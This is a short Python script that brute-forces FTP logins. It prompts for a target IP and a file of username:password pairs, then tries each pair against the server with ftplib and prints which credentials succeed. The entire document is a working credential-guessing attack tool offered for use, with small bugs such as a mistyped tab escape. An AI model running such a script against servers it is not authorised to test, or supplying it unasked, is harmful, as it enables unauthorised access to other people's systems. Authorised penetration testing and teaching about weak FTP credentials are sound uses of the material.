import ftplib


def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[!!] File does not exist!")
    for line in pF.readlines():
        try:
            username = line.split(":")[0]
            password = line.split(":")[1].strip("\n")
            print("[+] Trying credentials: %s:%s" % (username, password))
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print("\n Success! We logged in using: %s:%s" %
                  (username, password))
            ftp.quit()
            print("\n", "\t"*2, "#"*75, "\n")
        except:
            print("[-] Username and Password NOT found!")
            print("\n", "/t"*2, "#"*75, "\n")


print("\n", "\t"*5, "--->>>FTP Brute Force <<<---", "\n")
host = input("[+] Enter the Target IP: ")
passwdFile = input(
    "[+] Enter the directory or file name should be like (username:password): ")
bruteLogin(host, passwdFile)
